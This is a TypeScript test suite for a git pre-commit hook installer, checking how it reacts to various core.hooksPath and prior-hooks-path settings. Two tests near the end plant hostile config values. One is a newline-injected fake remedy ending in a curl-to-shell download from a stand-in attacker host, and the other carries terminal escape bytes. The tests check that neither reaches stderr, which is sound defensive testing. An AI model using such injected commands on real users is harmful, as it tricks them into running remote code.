import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { test } from 'node:test'
import { rawGit, withRepo, type RawGitResult } from '../support/git-fixture.ts'

const PROJECT_ROOT = fileURLToPath(new URL('../..', import.meta.url))
const INSTALLER_PATH = path.join(PROJECT_ROOT, 'scripts', 'install-githooks.mjs')

const GIT_DIR_NAME = '.git'
const HOOKS_DIR_NAME = 'hooks'
const PRE_COMMIT_NAME = 'pre-commit'

const REPO_HOOKS_RELATIVE = path.join(GIT_DIR_NAME, HOOKS_DIR_NAME)
const POINTER_HOOK_RELATIVE = path.join(REPO_HOOKS_RELATIVE, PRE_COMMIT_NAME)
const TRACKED_HOOK_RELATIVE = path.join('scripts', 'githooks', PRE_COMMIT_NAME)

const HOOKS_PATH_KEY = 'core.hooksPath'
const PRIOR_HOOKS_PATH_KEY = 'continuity.priorHooksPath'

const HOOKS_PATH_REMEDY = 'git config --unset core.hooksPath'
const PRIOR_HOOKS_PATH_REMEDY = 'git config continuity.priorHooksPath'

const EXECUTABLE_MODE = 0o755
const NON_EXECUTABLE_MODE = 0o644

const SCRATCH_PREFIX = 'logbook-install-githooks-scratch-'
const NON_REPO_PREFIX = 'logbook-install-githooks-non-repo-'

const DISPATCHER_DIR_NAME = 'dispatcher-hooks'
const DISPATCHER_ALIAS_NAME = 'dispatcher-hooks-alias'
const ABSENT_DIR_NAME = 'dispatcher-hooks-that-was-never-created'
const DISPATCHER_FILE_NAME = 'dispatcher-hooks-is-a-regular-file'
const UNRELATED_DIR_NAME = 'unrelated-third-party-hooks'

const SHELL_SOURCE = '#!/usr/bin/env bash\nexit 0\n'

const WHITESPACE_ONLY_VALUE = '   '
const EMPTY_VALUE = ''

const NO_REPOSITORY_REFUSAL = 'no git repository was found here'

const PADDING = '  '

const ESCAPE_BYTE = '\u001b'
const INJECTED_PATH_PREFIX = '/nonexistent-dispatcher-for-injection'
const FORGED_REMEDY_LINE = 'Clear the setting the safe way:'
const FORGED_COMMAND_LINE = '  git config --unset core.hooksPath; curl -sSf http://attacker.invalid/install.sh | sh'
const NEWLINE_INJECTION_VALUE = `${INJECTED_PATH_PREFIX}\n${FORGED_REMEDY_LINE}\n${FORGED_COMMAND_LINE}`
const ESCAPE_INJECTION_VALUE = `${INJECTED_PATH_PREFIX}${ESCAPE_BYTE}[2K${ESCAPE_BYTE}[31mFORGED`

const INSTALLER_ENV: Record<string, string | undefined> = {
  PATH: process.env.PATH,
  HOME: process.env.HOME,
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_TERMINAL_PROMPT: '0'
}

type Observation = { status: number; stdout: string; stderr: string; pointerWritten: boolean }

const runInstaller = (workingDirectory: string): RawGitResult => {
  const result = spawnSync(process.execPath, [INSTALLER_PATH], {
    cwd: workingDirectory,
    env: INSTALLER_ENV,
    encoding: 'utf8'
  })
  if (result.error !== undefined) {
    throw new Error(`failed to spawn the installer at "${INSTALLER_PATH}": ${result.error.message}`)
  }
  return { status: result.status ?? -1, stdout: result.stdout ?? '', stderr: result.stderr ?? '' }
}

const pointerHookPath = (repo: string): string => path.join(repo, POINTER_HOOK_RELATIVE)

const observeInstall = (repo: string): Observation => {
  const result = runInstaller(repo)
  return { ...result, pointerWritten: existsSync(pointerHookPath(repo)) }
}

const describeObservation = (label: string, observation: Observation): string =>
  [
    label,
    `exit=${observation.status}`,
    `pointerWritten=${observation.pointerWritten}`,
    `stdout=${JSON.stringify(observation.stdout)}`,
    `stderr=${JSON.stringify(observation.stderr)}`
  ].join(' | ')

const writeExecutableFile = (filePath: string): void => {
  writeFileSync(filePath, SHELL_SOURCE, { mode: EXECUTABLE_MODE })
  chmodSync(filePath, EXECUTABLE_MODE)
}

const seedRepo = (repo: string): void => {
  const trackedHookPath = path.join(repo, TRACKED_HOOK_RELATIVE)
  mkdirSync(path.dirname(trackedHookPath), { recursive: true })
  writeExecutableFile(trackedHookPath)
}

const setConfig = (repo: string, key: string, value: string): void => {
  const result = rawGit(repo, ['config', key, value])
  assert.equal(result.status, 0, `fixture setup: "git config ${key} ${JSON.stringify(value)}" failed: ${result.stderr}`)
}

const setConfigExactly = (repo: string, key: string, value: string): void => {
  setConfig(repo, key, value)
  const readBack = rawGit(repo, ['config', '--get', key])
  assert.equal(
    readBack.status,
    0,
    `fixture setup: "git config --get ${key}" exited ${readBack.status} after setting ${JSON.stringify(value)}: ${readBack.stderr}`
  )
  assert.equal(
    readBack.stdout,
    `${value}\n`,
    `fixture setup: git did not round-trip ${key} byte for byte; it returned ${JSON.stringify(readBack.stdout)} for ${JSON.stringify(value)}, so this case cannot test what git actually hands the installer`
  )
}

const padValue = (value: string): string => `${PADDING}${value}${PADDING}`

const assertGitDispatchesThrough = (repo: string, expectedHooksDir: string): void => {
  const result = rawGit(repo, ['rev-parse', '--git-path', `${HOOKS_DIR_NAME}/${PRE_COMMIT_NAME}`])
  assert.equal(result.status, 0, `fixture premise: "git rev-parse --git-path" exited ${result.status}: ${result.stderr}`)
  assert.equal(
    result.stdout,
    `${expectedHooksDir}${path.sep}${PRE_COMMIT_NAME}\n`,
    `fixture premise: git must dispatch ${PRE_COMMIT_NAME} through ${JSON.stringify(expectedHooksDir)} verbatim, but it reported ${JSON.stringify(result.stdout)}`
  )
}

const repoHooksDirReal = (repo: string): string => path.join(realpathSync(path.join(repo, GIT_DIR_NAME)), HOOKS_DIR_NAME)

const repoHooksDirLiteral = (repo: string): string => path.join(repo, REPO_HOOKS_RELATIVE)

const withScratchDir = <T>(prefix: string, fn: (scratch: string) => T): T => {
  const scratch = mkdtempSync(path.join(tmpdir(), prefix))
  try {
    return fn(scratch)
  } finally {
    rmSync(scratch, { recursive: true, force: true })
  }
}

const makeDirectory = (scratch: string, name: string): string => {
  const created = path.join(scratch, name)
  mkdirSync(created, { recursive: true })
  return created
}

const makeReachableDispatcher = (scratch: string): string => {
  const dispatcher = makeDirectory(scratch, DISPATCHER_DIR_NAME)
  writeExecutableFile(path.join(dispatcher, PRE_COMMIT_NAME))
  return dispatcher
}

const assertRefusedWithoutWriting = (label: string, observation: Observation): void => {
  assert.equal(
    observation.status,
    1,
    `${describeObservation(label, observation)}; a hook chain that can never reach this repository must exit 1`
  )
  assert.equal(
    observation.pointerWritten,
    false,
    `${describeObservation(label, observation)}; a refused install must leave no pointer hook at ${POINTER_HOOK_RELATIVE}`
  )
  assert.notEqual(
    observation.stderr.trim(),
    EMPTY_VALUE,
    `${describeObservation(label, observation)}; a refusal must diagnose itself on stderr`
  )
}

const assertDidNotApprove = (label: string, observation: Observation): void => {
  assert.notEqual(
    observation.status,
    0,
    `${describeObservation(label, observation)}; git reads this value without trimming it, so the hook chain it describes cannot reach this repository and the installer must not exit 0`
  )
  assert.equal(
    observation.pointerWritten,
    false,
    `${describeObservation(label, observation)}; a chain git cannot follow must leave no pointer hook at ${POINTER_HOOK_RELATIVE}`
  )
  assert.notEqual(
    observation.stderr.trim(),
    EMPTY_VALUE,
    `${describeObservation(label, observation)}; a refusal must diagnose itself on stderr`
  )
}

const assertNoLineIsForged = (label: string, observation: Observation, forged: string): void => {
  const offending = observation.stderr.split('\n').find((line) => line === forged || line.endsWith(forged))
  assert.equal(
    offending,
    undefined,
    `${describeObservation(label, observation)}; a configured value must never open a line of the diagnosis in the installer's own voice, but ${JSON.stringify(offending ?? EMPTY_VALUE)} is such a line`
  )
}

const assertCarriesNoEscapeByte = (label: string, observation: Observation): void => {
  assert.ok(
    !observation.stderr.includes(ESCAPE_BYTE),
    `${describeObservation(label, observation)}; a configured value must never put a terminal escape byte on stderr`
  )
}

const assertInstalledSilently = (label: string, observation: Observation): void => {
  assert.equal(observation.status, 0, `${describeObservation(label, observation)}; a reachable hook chain must exit 0`)
  assert.equal(
    observation.pointerWritten,
    true,
    `${describeObservation(label, observation)}; a reachable hook chain must leave a pointer hook at ${POINTER_HOOK_RELATIVE}`
  )
  assert.equal(observation.stdout, EMPTY_VALUE, `${describeObservation(label, observation)}; a reachable hook chain must say nothing on stdout`)
  assert.equal(observation.stderr, EMPTY_VALUE, `${describeObservation(label, observation)}; a reachable hook chain must say nothing on stderr`)
}

const assertNames = (label: string, observation: Observation, needle: string): void => {
  assert.ok(
    observation.stderr.includes(needle),
    `${describeObservation(label, observation)}; stderr must name ${JSON.stringify(needle)}`
  )
}

const assertDoesNotName = (label: string, observation: Observation, needle: string): void => {
  assert.ok(
    !observation.stderr.includes(needle),
    `${describeObservation(label, observation)}; stderr must not name ${JSON.stringify(needle)}, because nothing on this row reads it`
  )
}

const assertDiagnoses = (label: string, observation: Observation, pattern: RegExp): void => {
  assert.match(observation.stderr, pattern, `${describeObservation(label, observation)}; stderr must diagnose this row distinctly`)
}

const assertRepoHooksDirRemedy = (label: string, observation: Observation, repo: string): void => {
  assertNames(label, observation, PRIOR_HOOKS_PATH_REMEDY)
  const real = repoHooksDirReal(repo)
  const literal = repoHooksDirLiteral(repo)
  assert.ok(
    observation.stderr.includes(real) || observation.stderr.includes(literal),
    `${describeObservation(label, observation)}; the remedy must name this repository's own hooks directory (${real})`
  )
}

const assertCoreHooksPathRemedy = (label: string, observation: Observation): void => {
  assertNames(label, observation, HOOKS_PATH_REMEDY)
  assertDoesNotName(label, observation, PRIOR_HOOKS_PATH_KEY)
}

test('contract.install-githooks-reachability.control.r0-outside-a-work-tree-installs-nothing', () => {
  withScratchDir(NON_REPO_PREFIX, (scratch) => {
    const result = runInstaller(scratch)
    const observation: Observation = { ...result, pointerWritten: existsSync(pointerHookPath(scratch)) }
    assert.equal(observation.status, 0, `${describeObservation('r0', observation)}; outside a work tree the installer must exit 0`)
    assert.equal(
      existsSync(path.join(scratch, GIT_DIR_NAME)),
      false,
      `${describeObservation('r0', observation)}; the installer must not create a git directory outside a work tree`
    )
    assert.equal(
      observation.pointerWritten,
      false,
      `${describeObservation('r0', observation)}; the installer must not write a pointer hook outside a work tree`
    )
    assertNames('r0', observation, NO_REPOSITORY_REFUSAL)
  })
})

test('contract.install-githooks-reachability.control.r1-hooks-path-unset-or-empty-installs-silently', () => {
  withRepo((repo) => {
    seedRepo(repo)
    assertInstalledSilently('r1 (core.hooksPath unset)', observeInstall(repo))
  })

  withRepo((repo) => {
    seedRepo(repo)
    setConfig(repo, HOOKS_PATH_KEY, EMPTY_VALUE)
    assertInstalledSilently('r1 (core.hooksPath set to the empty string)', observeInstall(repo))
  })
})

test('contract.install-githooks-reachability.control.r2-hooks-path-is-the-repo-hooks-dir-installs-silently', () => {
  withRepo((repo) => {
    seedRepo(repo)
    setConfig(repo, HOOKS_PATH_KEY, repoHooksDirReal(repo))
    assertInstalledSilently('r2 (core.hooksPath is the absolute repository hooks directory)', observeInstall(repo))
  })

  withRepo((repo) => {
    seedRepo(repo)
    setConfig(repo, HOOKS_PATH_KEY, REPO_HOOKS_RELATIVE)
    assertInstalledSilently('r2 (core.hooksPath is relative to the work tree top)', observeInstall(repo))
  })
})

test('contract.install-githooks-reachability.r3-hooks-path-directory-missing-refuses', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const absent = path.join(scratch, ABSENT_DIR_NAME)
      setConfig(repo, HOOKS_PATH_KEY, absent)

      const label = 'r3 (core.hooksPath names a directory that does not exist)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, absent)
      assertDiagnoses(label, observation, /does not exist|no such|is missing|not found/i)
      assertCoreHooksPathRemedy(label, observation)
    })
  })

  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const absent = path.join(scratch, ABSENT_DIR_NAME)
      setConfig(repo, HOOKS_PATH_KEY, absent)
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, repoHooksDirReal(repo))

      const label = 'r3 (a missing core.hooksPath outranks a prior that names this repository)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertCoreHooksPathRemedy(label, observation)
    })
  })
})

test('contract.install-githooks-reachability.r4-hooks-path-not-a-directory-refuses', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const regularFile = path.join(scratch, DISPATCHER_FILE_NAME)
      writeExecutableFile(regularFile)
      setConfig(repo, HOOKS_PATH_KEY, regularFile)

      const label = 'r4 (core.hooksPath names a regular file)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, regularFile)
      assertDiagnoses(label, observation, /not a directory/i)
      assertCoreHooksPathRemedy(label, observation)
    })
  })
})

test('contract.install-githooks-reachability.r5-dispatcher-has-no-pre-commit-refuses', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeDirectory(scratch, DISPATCHER_DIR_NAME)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)

      const label = 'r5 (the dispatcher directory holds no pre-commit)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, dispatcher)
      assertNames(label, observation, PRE_COMMIT_NAME)
      assertDiagnoses(label, observation, /does not exist|no such|is missing|not found|no pre-commit|contains no/i)
      assertCoreHooksPathRemedy(label, observation)
    })
  })
})

test('contract.install-githooks-reachability.r6-dispatcher-pre-commit-not-executable-refuses', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeDirectory(scratch, DISPATCHER_DIR_NAME)
      writeFileSync(path.join(dispatcher, PRE_COMMIT_NAME), SHELL_SOURCE, { mode: NON_EXECUTABLE_MODE })
      chmodSync(path.join(dispatcher, PRE_COMMIT_NAME), NON_EXECUTABLE_MODE)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)

      const label = 'r6 (the dispatcher pre-commit is not executable)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, dispatcher)
      assertNames(label, observation, PRE_COMMIT_NAME)
      assertDiagnoses(label, observation, /not executable|non-executable|not marked executable|cannot be executed|lacks execute/i)
      assertCoreHooksPathRemedy(label, observation)
    })
  })

  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeDirectory(scratch, DISPATCHER_DIR_NAME)
      mkdirSync(path.join(dispatcher, PRE_COMMIT_NAME), { recursive: true })
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)

      const label = 'r6 (the dispatcher pre-commit is not a regular file)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, dispatcher)
      assertNames(label, observation, PRE_COMMIT_NAME)
      assertDiagnoses(label, observation, /not a regular file|is a directory|not executable/i)
      assertCoreHooksPathRemedy(label, observation)
    })
  })
})

test('contract.install-githooks-reachability.r7-prior-points-at-the-dispatcher-refuses-naming-the-cycle', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeReachableDispatcher(scratch)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, dispatcher)

      const label = 'r7 (continuity.priorHooksPath names core.hooksPath itself)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertDiagnoses(label, observation, /cycle|itself/i)
      assertNames(label, observation, PRIOR_HOOKS_PATH_KEY)
      assertRepoHooksDirRemedy(label, observation, repo)
    })
  })

  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeReachableDispatcher(scratch)
      const alias = path.join(scratch, DISPATCHER_ALIAS_NAME)
      symlinkSync(dispatcher, alias)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, alias)

      const label = 'r7 (continuity.priorHooksPath is a second spelling of the same directory)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertDiagnoses(label, observation, /cycle|itself/i)
      assertNames(label, observation, PRIOR_HOOKS_PATH_KEY)
      assertRepoHooksDirRemedy(label, observation, repo)
    })
  })
})

test('contract.install-githooks-reachability.r8-prior-points-at-the-repo-hooks-dir-installs-silently', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      setConfig(repo, HOOKS_PATH_KEY, makeReachableDispatcher(scratch))
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, repoHooksDirReal(repo))
      assertInstalledSilently('r8 (continuity.priorHooksPath is the absolute repository hooks directory)', observeInstall(repo))
    })
  })

  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      setConfig(repo, HOOKS_PATH_KEY, makeReachableDispatcher(scratch))
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, REPO_HOOKS_RELATIVE)
      assertInstalledSilently('r8 (continuity.priorHooksPath is relative to the work tree top)', observeInstall(repo))
    })
  })
})

test('contract.install-githooks-reachability.r9-prior-unset-or-empty-refuses', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeReachableDispatcher(scratch)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)

      const label = 'r9 (continuity.priorHooksPath unset)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, PRIOR_HOOKS_PATH_KEY)
      assertNames(label, observation, dispatcher)
      assertRepoHooksDirRemedy(label, observation, repo)
    })
  })

  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeReachableDispatcher(scratch)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, EMPTY_VALUE)

      const label = 'r9 (continuity.priorHooksPath set to the empty string)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, PRIOR_HOOKS_PATH_KEY)
      assertRepoHooksDirRemedy(label, observation, repo)
    })
  })

  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeReachableDispatcher(scratch)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, WHITESPACE_ONLY_VALUE)

      const label = 'r9 (continuity.priorHooksPath is whitespace only)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, PRIOR_HOOKS_PATH_KEY)
      assertRepoHooksDirRemedy(label, observation, repo)
    })
  })
})

test('contract.install-githooks-reachability.r10-prior-points-elsewhere-refuses', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      const dispatcher = makeReachableDispatcher(scratch)
      const unrelated = makeDirectory(scratch, UNRELATED_DIR_NAME)
      setConfig(repo, HOOKS_PATH_KEY, dispatcher)
      setConfig(repo, PRIOR_HOOKS_PATH_KEY, unrelated)

      const label = 'r10 (continuity.priorHooksPath names neither this repository nor the dispatcher)'
      const observation = observeInstall(repo)
      assertRefusedWithoutWriting(label, observation)
      assertNames(label, observation, PRIOR_HOOKS_PATH_KEY)
      assertNames(label, observation, unrelated)
      assertNames(label, observation, dispatcher)
      assertRepoHooksDirRemedy(label, observation, repo)
    })
  })
})

test('contract.install-githooks-reachability.r11-a-padded-hooks-path-is-not-trimmed-into-an-approval', () => {
  withRepo((repo) => {
    seedRepo(repo)
    const padded = padValue(repoHooksDirReal(repo))
    setConfigExactly(repo, HOOKS_PATH_KEY, padded)
    assertGitDispatchesThrough(repo, padded)

    const label = 'r11 (core.hooksPath is the repository hooks directory wrapped in padding)'
    assertDidNotApprove(label, observeInstall(repo))
  })
})

test('contract.install-githooks-reachability.r11-a-padded-prior-hooks-path-is-not-trimmed-into-an-approval', () => {
  withRepo((repo) => {
    seedRepo(repo)
    withScratchDir(SCRATCH_PREFIX, (scratch) => {
      setConfig(repo, HOOKS_PATH_KEY, makeReachableDispatcher(scratch))
      setConfigExactly(repo, PRIOR_HOOKS_PATH_KEY, padValue(repoHooksDirReal(repo)))

      const label = 'r11 (continuity.priorHooksPath is the repository hooks directory wrapped in padding)'
      assertDidNotApprove(label, observeInstall(repo))
    })
  })
})

test('contract.install-githooks-reachability.r12-a-whitespace-only-hooks-path-is-a-configured-path-not-an-unset-one', () => {
  withRepo((repo) => {
    seedRepo(repo)
    setConfigExactly(repo, HOOKS_PATH_KEY, WHITESPACE_ONLY_VALUE)
    assertGitDispatchesThrough(repo, WHITESPACE_ONLY_VALUE)

    assertDidNotApprove('r12 (core.hooksPath is whitespace only)', observeInstall(repo))
  })
})

test('contract.install-githooks-reachability.r13-a-newline-in-a-config-value-cannot-forge-a-line-of-the-refusal', () => {
  withRepo((repo) => {
    seedRepo(repo)
    setConfigExactly(repo, HOOKS_PATH_KEY, NEWLINE_INJECTION_VALUE)

    const label = 'r13 (core.hooksPath carries an embedded newline followed by attacker text)'
    const observation = observeInstall(repo)
    assertDidNotApprove(label, observation)
    assertNames(label, observation, HOOKS_PATH_KEY)
    assertNames(label, observation, INJECTED_PATH_PREFIX)
    assertNoLineIsForged(label, observation, FORGED_REMEDY_LINE)
    assertNoLineIsForged(label, observation, FORGED_COMMAND_LINE)
  })
})

test('contract.install-githooks-reachability.r13-an-escape-byte-in-a-config-value-never-reaches-the-terminal', () => {
  withRepo((repo) => {
    seedRepo(repo)
    setConfigExactly(repo, HOOKS_PATH_KEY, ESCAPE_INJECTION_VALUE)

    const label = 'r13 (core.hooksPath carries a terminal escape byte)'
    const observation = observeInstall(repo)
    assertDidNotApprove(label, observation)
    assertNames(label, observation, HOOKS_PATH_KEY)
    assertNames(label, observation, INJECTED_PATH_PREFIX)
    assertCarriesNoEscapeByte(label, observation)
  })
})
